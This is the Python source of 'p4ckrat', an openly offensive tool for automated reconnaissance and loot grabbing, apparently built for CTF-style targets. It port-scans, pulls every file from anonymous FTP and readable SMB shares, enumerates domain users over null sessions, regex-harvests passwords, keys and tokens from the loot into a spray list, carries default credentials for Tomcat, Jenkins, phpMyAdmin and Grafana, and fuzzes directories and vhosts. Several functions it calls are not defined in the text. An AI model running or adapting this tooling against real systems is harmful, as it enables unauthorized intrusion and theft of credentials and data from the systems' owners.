#!/usr/bin/env python3
r"""p4ckrat - full-auto recon & loot grabber (by p4cket). See README.md."""
import os
import re
import sys
import time
import json as _json
import signal
import shutil
import ftplib
import argparse
import tempfile
import threading
import subprocess
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed

SCRIPT_DIR = Path(__file__).resolve().parent

def _find_seclists():
    for p in (SCRIPT_DIR.parent/"wordlists"/"SecLists",
              SCRIPT_DIR/"wordlists"/"SecLists",
              Path("/usr/share/seclists"),
              Path("/usr/share/wordlists/seclists")):
        if p.exists():
            return p
    return Path("/usr/share/seclists")
SECLISTS = _find_seclists()

WORDLIST         = SECLISTS/"Discovery"/"Web-Content"/"raft-small-directories.txt"
RECURSE_WORDLIST = SECLISTS/"Discovery"/"Web-Content"/"common.txt"
USER_WORDLIST    = SECLISTS/"Usernames"/"top-usernames-shortlist.txt"
PASS_WORDLIST    = SECLISTS/"Passwords"/"Common-Credentials"/"10-million-password-list-top-100.txt"

DOMAIN          = ""
RATE            = 5000
THREADS         = 80
CONCURRENCY     = 4
ENABLE_HOSTS    = True
GOBUSTER_DEPTH  = 2          # recursion depth for discovered directories
GOBUSTER_BUDGET = 12         # max total gobuster runs (explosion guard)
GOBUSTER_EXT    = "php,txt,py"  # appended file extensions (empty = off)
DO_GOBUSTER     = True       # set at startup via prompt

FTP_MAX_DEPTH   = 8          # loop guard for recursive FTP pull
DO_UDP          = False      # parallel UDP top-20 scan (--udp)
DO_SPRAY        = True       # spray found creds against SSH/SMB/WinRM/FTP
DO_NUCLEI       = False      # nuclei scan on web ports (--nuclei)
DO_CRAWL        = False      # katana/gau crawl of web ports (--crawl)
DO_SECRETS      = False      # secretsdump on SMB admin (--secretsdump)
VERBOSITY       = 1          # 0=quiet, 1=normal, 2=verbose
DRY_RUN         = False      # only show which commands would run

# default creds for recognised web logins (app -> [(user, pass), ...])
WEB_DEFAULT_CREDS = {
    "tomcat":     [("tomcat","tomcat"),("admin","admin"),("tomcat","s3cret"),("admin","tomcat")],
    "jenkins":    [("admin","admin"),("admin","password")],
    "phpmyadmin": [("root",""),("root","root"),("root","password")],
    "grafana":    [("admin","admin")],
}

T_FULLSCAN = 480
T_SVCSCAN  = 360
T_GOBUSTER = 420
T_VHOST    = 150
T_HYDRA    = 300   # ~5 min budget - a long online brute means the path is elsewhere
T_GENERIC  = 180

_P = {"g":"\033[32m","G":"\033[92m","c":"\033[36m","C":"\033[96m",
      "y":"\033[33m","Y":"\033[93m","r":"\033[91m","w":"\033[97m",
      "d":"\033[90m","b":"\033[1m","0":"\033[0m"}
if not sys.stdout.isatty() or os.environ.get("NO_COLOR"):
    _P = {k:"" for k in _P}
def col(k,s): return f"{_P[k]}{s}{_P['0']}"

_LOCK = threading.Lock()
_T0 = time.monotonic()
_ANSI = re.compile(r"\033\[[0-9;]*m")
_LOGF = None
_FINDF = None
_LAST_EMIT = time.monotonic()
_PHASE = ""
def _ts(): return time.strftime("%H:%M:%S")
def _el(): return f"{time.monotonic()-_T0:.0f}s"
def emit(s=""):
    global _LAST_EMIT
    with _LOCK:
        print(s, flush=True)
        _LAST_EMIT = time.monotonic()
        if _LOGF:
            try: _LOGF.write(_ANSI.sub("", s)+"\n"); _LOGF.flush()
            except Exception: pass

def set_logs(logf, findf):
    global _LOGF, _FINDF; _LOGF, _FINDF = logf, findf

def _heartbeat(stop, idle=15, tick=5):
    """Print a dim 'still working' line when output has been silent for a while,
    so long quiet phases (ffuf, nxc, cred-scan) don't look like a crash."""
    while not stop.wait(tick):
        if VERBOSITY < 1: continue
        quiet = time.monotonic() - _LAST_EMIT
        if quiet >= idle:
            ph = f" in {_PHASE}" if _PHASE else ""
            emit(col("d", f"[~] still working{ph}... {_el()} elapsed"))

def start_heartbeat():
    stop = threading.Event()
    threading.Thread(target=_heartbeat, args=(stop,), daemon=True).start()
    return stop

_TAGCOL = {}
_TAGCOL_LOCK = threading.Lock()
_PALETTE = ["c","G","Y","g","C","y"]
def _tagcolor(t):
    with _TAGCOL_LOCK:
        if t not in _TAGCOL: _TAGCOL[t] = _PALETTE[len(_TAGCOL) % len(_PALETTE)]
        return _TAGCOL[t]
def _pfx(t): return col(_tagcolor(t), t)+" " if t else ""

def info(s, t=None):
    if VERBOSITY >= 1: emit(col("c","[*] ")+_pfx(t)+s)
def ok(s,   t=None): emit(col("G","[+] ")+_pfx(t)+col("w",s))
def warn(s, t=None): emit(col("Y","[!] ")+_pfx(t)+s)
def err(s,  t=None): emit(col("r","[-] ")+_pfx(t)+s)
def raw(line, t=None):
    if VERBOSITY >= 1: emit("    "+_pfx(t)+col("d",line))
def dbg(s, t=None):
    if VERBOSITY >= 2: emit(col("d","[~] ")+_pfx(t)+col("d",s))

def finding(cat, text, t=None):
    if _FINDF:
        with _LOCK:
            try: _FINDF.write(f"[{_ts()}] {cat:<6} {text}\n"); _FINDF.flush()
            except Exception: pass
    emit(col("G","[+] ")+col(_tagcolor(t) if t else "G", cat.lower()+": ")+col("w",text))

def head(s):
    global _PHASE
    _PHASE = s.lower()
    emit()
    emit(col("b",s.lower()))

# credentials collected for the spray/pivot phase.
# entry: dict(user, secret, kind, source). kind: "pw" (plaintext) | "hash" (NT/LM:NT).
_CREDS = []
_CREDS_LOCK = threading.Lock()
def add_cred(user, secret, source, kind="pw", announce=True):
    if not user or secret is None: return
    with _CREDS_LOCK:
        if any(c["user"] == user and c["secret"] == secret and c["kind"] == kind
               for c in _CREDS):
            return
        _CREDS.append({"user": user, "secret": secret, "kind": kind, "source": source})
    if announce:   # show the actual plaintext/hash we harvested
        shown = secret if kind == "pw" else secret[:20]+"..(NT)"
        who = user if user != "__PW_ONLY__" else "<any-user>"
        finding("CREDS", f"{who}:{shown}  ({source})", "creds")

# paths the web phase already knows (gobuster/crawl) - for robots/sitemap dedup.
_WEB_PATHS = set()
_WEB_PATHS_LOCK = threading.Lock()
def note_web_path(path):
    with _WEB_PATHS_LOCK:
        _WEB_PATHS.add(path.rstrip("/").lower() or "/")
def web_path_known(path):
    with _WEB_PATHS_LOCK:
        return (path.rstrip("/").lower() or "/") in _WEB_PATHS

BANNER = r"""
          _____          __                   __
______   /  |  |   ____ |  | ______________ _/  |_
\____ \ /   |  |__/ ___\|  |/ /\_  __ \__  \\   __\
|  |_> >    ^   /\  \___|    <  |  | \// __ \|  |
|   __/\____   |  \___  >__|_ \ |__|  (____  /__|
|__|        |__|      \/     \/            \/"""
def banner(ip):
    emit(col("G", col("b", BANNER)))
    emit(col("d","   full-auto recon & loot grabber - by p4cket - github.com/pwl-de"))
    emit(col("d",f"   target {ip}   started {_ts()}"))
    emit(col("d",f"   lists {SECLISTS}"))
    emit()

def have(tool): return shutil.which(tool) is not None

_POSIX = (os.name == "posix")

def _popen(cmd, **kw):
    """Popen that opens its own process group on POSIX (for a clean kill).
    stdin is detached (DEVNULL) so a child that wants a password/confirmation
    (mysql -p, ssh, ffuf) reads EOF instead of blocking on our terminal."""
    if _POSIX:
        kw["start_new_session"] = True
    kw.setdefault("stdin", subprocess.DEVNULL)
    return subprocess.Popen(cmd, **kw)

def _killtree(p):
    """Kill p and - on POSIX - its whole process group (gobuster workers etc.)."""
    try:
        if _POSIX:
            os.killpg(os.getpgid(p.pid), signal.SIGKILL)
        else:
            p.kill()
    except Exception:
        try: p.kill()
        except Exception: pass

def _dry(cmd, t=None):
    emit(col("y","[dry] ")+_pfx(t)+col("d"," ".join(cmd)))

def run(cmd, outfile=None, timeout=T_GENERIC):
    if DRY_RUN:
        _dry(cmd); return (0, "")
    dbg("exec "+" ".join(cmd))
    try:
        p = _popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                   text=True, errors="replace")
    except FileNotFoundError:
        return (127, "")
    # drain the pipe in its own thread -> no deadlock on a full buffer (even on kill).
    buf = []
    reader = threading.Thread(target=lambda: buf.append(p.stdout.read()), daemon=True)
    reader.start()
    try:
        p.wait(timeout=timeout); rc = p.returncode
    except subprocess.TimeoutExpired:
        _killtree(p)
        try: p.wait(timeout=5)
        except Exception: pass
        rc = 124
    reader.join(timeout=5)
    try: p.stdout.close()
    except Exception: pass
    out = (buf[0] if buf else "") or ""
    if outfile: Path(outfile).write_text(out, errors="replace")
    return (rc, out)

def run_live(cmd, t=None, outfile=None, timeout=T_GENERIC, filt=None, echo=True):
    """Stream stdout live (tagged) + tee to file. filt(line)->bool filters output."""
    if DRY_RUN:
        _dry(cmd, t); return (0, "")
    dbg("exec "+" ".join(cmd), t)
    try:
        p = _popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                   text=True, errors="replace", bufsize=1)
    except FileNotFoundError:
        warn(f"not installed: {cmd[0]}", t); return (127, "")
    timed_out = {"v": False}
    def _on_timeout():
        timed_out["v"] = True; _killtree(p)
    killer = threading.Timer(timeout, _on_timeout); killer.start()
    buf = []
    try:
        for line in p.stdout:
            buf.append(line)
            ln = line.rstrip("\n")
            # -v shows everything, otherwise only filtered lines
            if ln and ((echo and (filt is None or filt(ln))) or VERBOSITY >= 2):
                raw(ln, t)
        p.wait()
    finally:
        killer.cancel()
    text = "".join(buf)
    if outfile: Path(outfile).write_text(text, errors="replace")
    rc = 124 if timed_out["v"] else (p.returncode or 0)
    return (rc, text)

CRED_RE = re.compile("|".join([
    r"-----BEGIN (?:RSA|OPENSSH|DSA|EC|PGP) PRIVATE KEY-----",
    r"pass(?:word|wd|phrase)?\s*[:=]\s*\S+",
    r"\bpwd\s*[:=]\s*\S+",
    r"(?:api[_-]?key|secret|token|auth)\s*[:=]\s*\S+",
    r"user(?:name)?\s*[:=]\s*\S+",
    r"(?:mysql|postgres|mongodb|mssql|jdbc)://\S+",
    r"\bconnectionstring\b.*",
    r"AKIA[0-9A-Z]{16}",
    r"\b[\w.+-]+@[\w-]+\.[\w.-]+:\S+",
    r"\b(?:sa|root|admin|administrator)\s*[:=/]\s*\S+",
]), re.IGNORECASE)
SKIP_EXT = {".png",".jpg",".jpeg",".gif",".ico",".pdf",".zip",".gz",".exe",
            ".dll",".so",".bin",".woff",".woff2",".ttf",".mp3",".mp4",".css",".svg"}

_USER_VAL = re.compile(r"(?i)\b(?:user(?:name)?|login|uid)\s*[:=]\s*[\"']?([^\s\"',;]{2,64})")
_PASS_VAL = re.compile(r"(?i)\b(?:pass(?:word|wd|phrase)?|pwd|secret)\s*[:=]\s*[\"']?([^\s\"',;]{2,128})")
# prose: "... password to BabyStart123!", "pwd is Hunter2", "password = foo"
_PROSE_PW = re.compile(
    r"(?i)\bpass(?:word|wd|phrase)?\b\s*"
    r"(?:is|was|are|be|set\s+to|changed\s+to|reset\s+to|to|for\s+\S+\s+is|[:=]|->)?\s*"
    r"[\"']?([^\s\"',;]{4,128})")
_URI_CRED = re.compile(r"(?i)\b[a-z]+://([^\s:/@]+):([^\s@/]+)@")
_COMBO    = re.compile(r"^\s*([A-Za-z0-9._\-\\]{2,64}):([^\s:]{2,128})\s*$")
_PAIR_WINDOW = 4   # user and pass count as a pair when <= N lines apart

def _looks_like_secret(v):
    """Filter prose hits: needs a digit/special char, not a plain word like 'policy'."""
    if len(v) < 4 or len(v) > 128: return False
    if v.lower() in ("policy","complexity","requirements","expired","history","length",
                     "never","empty","blank","unknown","changed","reset","above","below"):
        return False
    return bool(re.search(r"[0-9!@#$%^&*._\-]", v))

def _scan_pairs(text, src):
    """Heuristic: pair user+pass within the same file/window -> add_cred."""
    users, passes = [], []   # (lineno, value)
    for i, line in enumerate(text.splitlines(), 1):
        for m in _URI_CRED.finditer(line):
            add_cred(m.group(1), m.group(2), f"credscan:{src}")
        cm = _COMBO.match(line)
        if cm and not line.lower().startswith(("http","ftp")):
            cu, cpw = cm.group(1), cm.group(2)
            # drop paths / HTTP directives / host:port / all-numeric pairs
            if (not cpw.startswith(("/",".")) and cu.lower() not in (
                    "disallow","allow","user-agent","sitemap","host","location","note")
                    and not (_is_ip(cu) and cpw.isdigit())
                    and not (cu.isdigit() and cpw.isdigit())):
                add_cred(cu, cpw, f"credscan:{src}")
        for m in _USER_VAL.finditer(line): users.append((i, m.group(1)))
        for m in _PASS_VAL.finditer(line): passes.append((i, m.group(1)))
        # also collect prose passwords (e.g. AD description field)
        for m in _PROSE_PW.finditer(line):
            if _looks_like_secret(m.group(1)):
                passes.append((i, m.group(1)))
    for pl, pv in passes:
        near = [(abs(pl-ul), ul, uv) for ul, uv in users if abs(pl-ul) <= _PAIR_WINDOW]
        if near:
            near.sort()
            add_cred(near[0][2], pv, f"credscan:{src}")
        else:
            # password with no user nearby -> spray against known usernames
            add_cred("__PW_ONLY__", pv, f"credscan:{src}")

def scan_creds(root):
    """Search loot for credentials: report lines + add_cred pairs."""
    root = Path(root); hits = []
    if not root.exists(): return hits
    for f in root.rglob("*"):
        if not f.is_file() or f.suffix.lower() in SKIP_EXT: continue
        try:
            if f.stat().st_size > 5_000_000: continue
            with open(f, "rb") as fh:
                if b"\x00" in fh.read(4096): continue   # binary (unknown ext)
            text = f.read_text(errors="replace")
        except OSError:
            continue
        for i, line in enumerate(text.splitlines(), 1):
            if CRED_RE.search(line):
                hits.append(f"{f}:{i}: {line.strip()[:200]}")
            else:
                pm = _PROSE_PW.search(line)
                if pm and _looks_like_secret(pm.group(1)):
                    hits.append(f"{f}:{i}: {line.strip()[:200]}")
        _scan_pairs(text, f.name)
    return hits

def udp_scan(ip, svcmap):
    """UDP top-20 in parallel - finds DNS/SNMP/TFTP etc. Extends svcmap."""
    info("udp top-20 scan", "nmap")
    _, o = run_live(["nmap","-sU","--top-ports","20","--open","-Pn","-n", ip],
                    t="nmap", timeout=T_SVCSCAN,
                    filt=lambda l: "/udp" in l and "open" in l)
    for m in re.finditer(r"(\d+)/udp\s+open\s+(\S+)", o):
        port, name = m.group(1), m.group(2)
        if port not in svcmap:
            svcmap[port] = (name, "udp")
    udp = sorted({m.group(1) for m in re.finditer(r"(\d+)/udp\s+open", o)}, key=int)
    if udp: ok("Open UDP ports: "+col("G",", ".join(udp)), "nmap")

def portscan(ip):
    head("PORT-SCAN")
    info("full port scan (all 65535 ports)", "nmap")
    _, full = run_live(["nmap","-p-","--min-rate",str(RATE),"-T4","-Pn","-n","-v", ip],
             t="nmap", timeout=T_FULLSCAN,
             filt=lambda l: "Discovered open port" in l or "Completed" in l or "scan report" in l)
    ports = sorted({m.group(1) for m in
                    re.finditer(r"Discovered open port (\d+)/tcp", full)}, key=int)
    svcmap = {}
    if not ports:
        warn("no open tcp ports, trying udp top-50", "nmap")
        run_live(["nmap","-sU","--top-ports","50","-Pn","-n", ip],
                 t="nmap", timeout=T_SVCSCAN)
        return {}, ""
    ok("Open ports: "+col("G",", ".join(ports)), "nmap")
    info("service scan on open ports", "nmap")
    _, svc = run_live(["nmap","-p",",".join(ports),"-sCV","-Pn","-n", ip],
                      t="nmap", timeout=T_SVCSCAN,
                      filt=lambda l: bool(re.match(r"\d+/tcp", l)) or "|" in l)
    for line in svc.splitlines():
        m = re.match(r"\s*(\d+)/tcp\s+open\s+(\S+)\s*(.*)", line)
        if m: svcmap[m.group(1)] = (m.group(2), m.group(3))
    if DO_UDP:
        udp_scan(ip, svcmap)
    return svcmap, svc

def _is_ip(s): return bool(re.fullmatch(r"[\d.]+", s))

# public CA / CDN names that show up in cert SANs but are never the target vhost
_SAN_NOISE = ("verisign.com","digicert.com","sectigo.com","comodoca.com",
              "letsencrypt.org","cloudflaressl.com","cloudflare.com","example.com",
              "example.org","localhost","akamai.net","amazonaws.com")
def all_hostnames(ip, svc):
    """Collect all plausible vhosts: redirect, CN, ALL cert SANs, curl redirect."""
    hosts = []
    def add(h):
        h = (h or "").strip("/").lower()
        if not h or _is_ip(h) or h in hosts:
            return
        if any(h == n or h.endswith("."+n) for n in _SAN_NOISE):
            return   # public CA/CDN SAN, not the box
        hosts.append(h)
    if DOMAIN: add(DOMAIN)
    for m in re.finditer(r"redirect to https?://([A-Za-z0-9.\-]+)", svc): add(m.group(1))
    for m in re.finditer(r"commonName=([A-Za-z0-9.\-]+)", svc): add(m.group(1))
    for m in re.finditer(r"DNS:([A-Za-z0-9.\-]+)", svc): add(m.group(1))   # alle SANs
    if not hosts and have("curl"):
        _, o = run(["curl","-skI","-m","10",f"http://{ip}/"], timeout=15)
        m = re.search(r"(?i)^location:\s*https?://([A-Za-z0-9.\-]+)", o, re.M)
        if m: add(m.group(1))
    return hosts

_HOSTS_LOCK = threading.Lock()
def add_host(ip, host):
    if not (ENABLE_HOSTS and host): return
    if not _POSIX:
        warn(f"/etc/hosts only on Linux/macOS. Manually: {ip} {host}", "hosts"); return
    if DRY_RUN:
        emit(col("y","[dry] ")+_pfx("hosts")+col("d",f"echo '{ip}\t{host}' >> /etc/hosts")); return
    with _HOSTS_LOCK:
        try:
            hp = Path("/etc/hosts"); content = hp.read_text()
            # match the line that lists `host` as a full token (not a substring like
            # `baby` inside `baby.vl`), ignoring comment lines.
            line_re = re.compile(rf"(?m)^[^\n#]*?\s{re.escape(host)}(?=\s|$)[^\n]*$")
            m = line_re.search(content)
            if m:
                cur_ip = m.group(0).split()[0]
                if cur_ip == ip:
                    return                       # already mapped correctly
                # stale mapping (recycled box IP) -> rewrite it
                hp.write_text(line_re.sub(f"{ip}\t{host}", content))
                ok(f"/etc/hosts ~> {ip} {host} (was {cur_ip})", "hosts")
                return
            with hp.open("a") as f: f.write(f"{ip}\t{host}\n")
            ok(f"/etc/hosts += {ip} {host}", "hosts")
        except PermissionError:
            warn(f"/etc/hosts not writable (need root). Manually: {ip} {host}", "hosts")
        except OSError as e:
            warn(f"/etc/hosts: {e}", "hosts")

def ftp_anon(ip, out):
    info("checking anonymous ftp", "ftp")
    if DRY_RUN:
        emit(col("y","[dry] ")+_pfx("ftp")+col("d",f"ftplib anonymous@{ip}:21 + recursive RETR")); return
    dest = out/"files"/"ftp"   # only created once a file actually arrives
    try:
        ftp = ftplib.FTP(); ftp.connect(ip, 21, timeout=15)
        ftp.login("anonymous","anonymous@")
        finding("FTP", "anonymous login allowed", "ftp")
        ok("anonymous login ok, downloading all files", "ftp")
    except Exception as e:
        warn(f"no anon ftp: {e}", "ftp"); return
    n = [0]; seen = set()
    def is_dir(name):
        # directory = we can cd into it. remember cwd before/after.
        try:
            cur = ftp.pwd(); ftp.cwd("/"+name.strip("/")); ftp.cwd(cur); return True
        except Exception:
            return False
    def pull(path="", depth=0):
        if depth > FTP_MAX_DEPTH:
            warn(f"max depth reached at {path}", "ftp"); return
        try: items = ftp.nlst(path)
        except Exception: return
        for it in items:
            if it in (".",".."): continue
            name = it if (not path or it.startswith(path)) else f"{path.rstrip('/')}/{it}"
            key = name.strip("/")
            if key in seen: continue        # loop guard (cyclic links)
            seen.add(key)
            if is_dir(name):
                pull(name, depth+1)
            else:
                local = dest/name.lstrip("/"); local.parent.mkdir(parents=True, exist_ok=True)
                try:
                    with open(local,"wb") as fh: ftp.retrbinary("RETR "+name, fh.write)
                    n[0]+=1; raw("get "+name, "ftp")
                except Exception: pass
    try: pull()
    finally:
        try: ftp.quit()
        except Exception: pass
    if n[0]:
        ok(f"{n[0]} file(s) -> {dest}", "ftp")
    else:
        warn("anon login ok, but no files found", "ftp")

def _nxc():
    return shutil.which("nxc") or shutil.which("netexec") or shutil.which("crackmapexec")

def _nxc_auth(user, secret, kind):
    """netexec auth: plaintext (-p) or NT hash (-H)."""
    if not user:
        return ["-u","","-p",""]              # null session
    return ["-u",user, ("-H" if kind == "hash" else "-p"), secret]

def _smb_auth(user=None, pw=None):
    """smbclient/smbmap auth args: None/empty = null session (-N)."""
    if user:
        return (["-U", f"{user}%{pw or ''}"], f"{user}")
    return (["-N"], "anon")

def smb_grab(ip, out, user=None, pw=None):
    """List shares and recursively pull readable ones. With or without creds."""
    if not have("smbclient"):
        warn("smbclient missing, skipping share grab", "smb"); return
    auth, label = _smb_auth(user, pw)
    sub = "smb" if not user else f"smb_{re.sub(r'[^A-Za-z0-9]+','_',user)}"
    dest = out/"files"/sub
    _, listing = run(["smbclient", *auth, "-L", f"//{ip}/"], timeout=T_GENERIC)
    shares = [s for s in re.findall(r"^\s*(\S+)\s+Disk", listing, re.M)
              if s.upper() not in ("ADMIN$","IPC$","C$","PRINT$")]
    if not shares:
        warn(f"no readable shares ({label})", "smb"); return
    finding("SMB", f"readable shares ({label}): "+", ".join(shares), "smb")
    for sh in shares:
        sdir = dest/sh; sdir.mkdir(parents=True, exist_ok=True)
        info(f"grabbing share '{sh}' ({label})", "smb")
        run(["smbclient", *auth, f"//{ip}/{sh}","-c",
             f"recurse ON; prompt OFF; lcd {sdir}; mget *"], timeout=T_GENERIC)
        if not any(sdir.rglob("*")):   # share was empty / nothing readable
            shutil.rmtree(sdir, ignore_errors=True)
    if dest.exists() and any(dest.rglob("*")):
        ok(f"SMB-Files ({label}) -> {dest}", "smb")
    else:
        shutil.rmtree(dest, ignore_errors=True)
        warn(f"shares listed, but no files downloadable ({label})", "smb")

def _save_users(out, name, users):
    if not users: return
    try:
        (out/"files").mkdir(parents=True, exist_ok=True)
        (out/"files"/name).write_text("\n".join(users)+"\n")
    except OSError:
        pass

def nxc_smb_enum(ip, out, user=None, secret=None, kind="pw"):
    """netexec as the main SMB weapon: shares/users/pass-pol/loggedon + spider_plus."""
    nxc = _nxc()
    if not nxc: return
    label = user or "null"
    auth = _nxc_auth(user, secret, kind)
    info(f"netexec smb enum ({label})", "smb")
    # host/domain banner
    _, base = run([nxc,"smb",ip,*auth], timeout=40)
    _, sh = run([nxc,"smb",ip,*auth,"--shares"], timeout=60)
    writ = re.findall(r"^\s*(\S+)\s+(?:READ,WRITE|WRITE)\b", sh, re.M)
    for w in sorted(set(writ)):
        finding("SMB", f"WRITABLE share: {w} ({label})", "smb")
    _, us = run([nxc,"smb",ip,*auth,"--users"], timeout=60)
    users = []
    for line in us.splitlines():
        # format: SMB  <ip>  <port>  <HOST>  <username>  <rest...>
        m = re.match(r"\s*SMB\s+\S+\s+\d+\s+\S+\s+(?:\[.\]\s+)?([A-Za-z0-9._\-]+)\b", line)
        if not m: continue
        u = m.group(1)
        if u.lower() in ("username","-username-","windows","error","got","enumerated"): continue
        users.append(u)
    users = sorted(set(users))
    _save_users(out, "nxc_users.txt", users)
    if users:
        finding("SMB", f"users ({label}): "+", ".join(users[:40]), "smb")
    run([nxc,"smb",ip,*auth,"--pass-pol"], timeout=40)
    run([nxc,"smb",ip,*auth,"--loggedon-users"], timeout=40)
    # auto share-spider only with creds (not null)
    if user:
        info(f"spider_plus ({label})", "smb")
        run([nxc,"smb",ip,*auth,"-M","spider_plus"], timeout=T_SVCSCAN)

def smb_anon(ip, out):
    info("enumerate SMB (139/445)", "smb")
    if have("smbmap"):
        run_live(["smbmap","-H",ip], t="smb", timeout=T_GENERIC,
                 filt=lambda l: "READ" in l or "Disk" in l or "ANONYMOUS" in l)
    # named-pipe / null-session check
    if have("smbclient"):
        _, ipc = run(["smbclient","-N","//"+ip+"/IPC$","-c","help"], timeout=60)
        if ipc and "NT_STATUS_ACCESS_DENIED" not in ipc:
            dbg("IPC$ null-session reachable", "smb")
    # netexec as the main weapon (null session: shares/users/pass-pol/loggedon)
    nxc_smb_enum(ip, out)
    # user enum: prefer enum4linux-ng, else rpcclient RID cycling
    users = []
    if have("enum4linux-ng"):
        info("enum4linux-ng (users/shares/policy)", "smb")
        _, o = run_live(["enum4linux-ng","-A", ip], t="smb", timeout=T_SVCSCAN,
                        filt=lambda l: "user:" in l.lower() or "[+]" in l)
        users = sorted(set(re.findall(r"(?i)username:\s*([^\s,]+)", o)))
    elif have("rpcclient"):
        info("rpcclient RID-cycling (enumdomusers)", "smb")
        _, o = run(["rpcclient","-U","","-N",ip,"-c","enumdomusers"], timeout=T_GENERIC)
        users = sorted(set(re.findall(r"user:\[([^\]]+)\]", o)))
    if users:
        finding("SMB", "domain users: "+", ".join(users[:40]), "smb")
        try:
            (out/"files").mkdir(parents=True, exist_ok=True)
            (out/"files"/"smb_users.txt").write_text("\n".join(users)+"\n")
        except OSError:
            pass
    smb_grab(ip, out)   # anonyme Shares

def _parse_gobuster(text):
    """-> Liste (path, status, is_dir)."""
    res = []
    for m in re.finditer(r"^(\/\S*)\s+\(Status:\s*(\d+)\)(.*)$", text, re.M):
        path, st, rest = m.group(1), m.group(2), m.group(3)
        red = re.search(r"-->\s*(\S+)", rest)
        redt = red.group(1).strip("]") if red else ""
        is_dir = (st in ("301","302") and redt.endswith("/")) \
                 or (st == "200" and "." not in path.rsplit("/",1)[-1])
        res.append((path, st, bool(is_dir)))
    return res

def gobuster_recursive(base, tag, budget):
    """Recursive gobuster. Hits -> findings, no file dumps."""
    if not have("gobuster"):
        warn("gobuster missing", tag); return
    if not WORDLIST.exists():
        warn(f"wordlist missing: {WORDLIST}", tag); return
    seen = set(); queue = [(base.rstrip("/")+"/", 0)]
    while queue and budget[0] > 0:
        url, depth = queue.pop(0)
        if url in seen: continue
        seen.add(url); budget[0] -= 1
        wl = WORDLIST if depth == 0 else RECURSE_WORDLIST
        info(f"gobuster d{depth} {url}  ({wl.name})", tag)
        gcmd = ["gobuster","dir","-u",url,"-w",str(wl),"-t",str(THREADS),
                "-q","-k","--no-error","--timeout","10s"]
        if GOBUSTER_EXT: gcmd += ["-x",GOBUSTER_EXT]
        _, txt = run_live(gcmd, t=tag, timeout=T_GOBUSTER, echo=False,
                          filt=lambda l: "Status:" in l)
        for path, st, is_dir in _parse_gobuster(txt):
            finding("WEB", f"{url.rstrip('/')}{path}  ({st})", tag)
            note_web_path(path)
            if is_dir and depth < GOBUSTER_DEPTH:
                child = url.rstrip("/")+path if path.startswith("/") else url+path
                child = child.rstrip("/")+"/"
                if child not in seen:
                    queue.append((child, depth+1))

# Spannende Dinge im HTML: Credentials, Flags, Hinweise, Kommentare.
WEB_HINT_RE = re.compile(
    r"(?i)(pass(?:word|wd|phrase)?\s*[:=]?\s*\S*"
    r"|user(?:name)?\s*[:=]?\s*\S*"
    r"|api[_-]?key|secret|token|auth[_-]?key"
    r"|flag\{[^}]*\}|todo|fixme|<!--.*?-->)")

_WEB_PORTS_KNOWN = {"80","443","8080","8000","8443","8081","8888","8008","5000","3000"}
_NONWEB_NAME = ("ncacn", "msrpc", "mc-nmf", "wsman", "netbios", "tcpwrapped")
def _is_web(port, name):
    """Real browseable HTTP only. Excludes RPC-over-HTTP (ncacn_http), ADWS (mc-nmf)
    and WinRM (5985/5986) - those merely contain 'http' but aren't web apps."""
    n = (name or "").lower()
    if port in ("5985","5986"): return False
    if any(x in n for x in _NONWEB_NAME): return False
    if port in _WEB_PORTS_KNOWN: return True
    return n.startswith("http") or n in ("https","ssl/http","ssl/https","http-alt","http-proxy")

def web(ip, port, out, host):
    """Fetch index only. The file is saved ONLY if the HTML contains something interesting."""
    tag = f"web:{port}"
    scheme = "https" if port in ("443","8443") else "http"
    info(f"fetch web index ({scheme})", tag)
    if not have("curl"):
        warn("curl missing, skipping web", tag); return
    seen_urls = set()
    for url in ([f"{scheme}://{host}:{port}/"] if host else []) + [f"{scheme}://{ip}:{port}/"]:
        if url in seen_urls: continue
        seen_urls.add(url)
        _, body = run(["curl","-sk","-m","15","-L",url], timeout=30)
        if not body: continue
        tt = re.search(r"(?is)<title>(.*?)</title>", body)
        if tt: info(f"{url}  <title> {tt.group(1).strip()[:70]}", tag)
        hints = []
        for m in WEB_HINT_RE.finditer(body):
            s = m.group(0).strip().replace("\n"," ")[:120]
            if s and s.lower() not in (h.lower() for h in hints): hints.append(s)
            if len(hints) >= 8: break
        if not hints:
            continue  # nothing interesting -> no file, no web folder
        wd = out/"files"/"web"; wd.mkdir(parents=True, exist_ok=True)
        tagf = re.sub(r"\W+","_",url).strip("_")
        page = wd/f"{tagf}.html"
        page.write_text(body, errors="replace")
        finding("WEB", f"interesting html at {url} -> {page}", tag)
        for h in hints: raw("hint "+h, tag)
    primary = host or ip
    base = f"{scheme}://{primary}:{port}"
    apps = web_fingerprint(base, tag)
    if DO_GOBUSTER:
        gobuster_recursive(base, tag, [GOBUSTER_BUDGET])
    web_lowhang(base, ip, port, scheme, tag)   # robots/sitemap: new paths only
    if DO_CRAWL:
        web_crawl(base, out, tag)
    if apps:
        web_default_creds(base, apps, tag)
    vhost_fuzz(ip, port, scheme, host, tag)
    if DO_NUCLEI:
        nuclei_scan(ip, port, scheme, host, tag)

_VHOST_DONE = set()   # bases already fuzzed - avoid repeating per web port
def vhost_fuzz(ip, port, scheme, host, tag):
    """vhost brute via ffuf Host: header. Needs a domain (DOMAIN or host)."""
    base = DOMAIN or (host.split(".",1)[-1] if host and "." in host else "")
    if not base:
        dbg("vhost fuzz skipped (no domain)", tag); return
    if base in _VHOST_DONE:
        dbg(f"vhost fuzz for {base} already done", tag); return
    _VHOST_DONE.add(base)
    if not have("ffuf"):
        dbg("ffuf missing, vhost fuzz skipped", tag); return
    # smaller list by default (fast); bump to -5000/-20000 for more coverage
    wl = SECLISTS/"Discovery"/"DNS"/"subdomains-top1million-110.txt"
    if not wl.exists():
        wl = SECLISTS/"Discovery"/"DNS"/"subdomains-top1million-5000.txt"
    if not wl.exists():
        dbg(f"vhost wordlist missing: {wl.name}", tag); return
    info(f"vhost fuzzing *.{base} ({wl.name})", tag)
    # measuring a baseline size first would be ideal; ffuf -ac auto-filters.
    _, o = run_live(["ffuf","-u",f"{scheme}://{ip}:{port}/","-H",f"Host: FUZZ.{base}",
                     "-w",str(wl),"-t",str(THREADS),"-ac","-s"],
                    t=tag, timeout=T_VHOST, echo=False)
    for sub in sorted(set(l.strip() for l in o.splitlines() if l.strip())):
        if re.fullmatch(r"[A-Za-z0-9_.-]+", sub):
            vhost = f"{sub}.{base}"
            finding("VHOST", f"{vhost} (Host-header on {ip}:{port})", tag)
            add_host(ip, vhost)
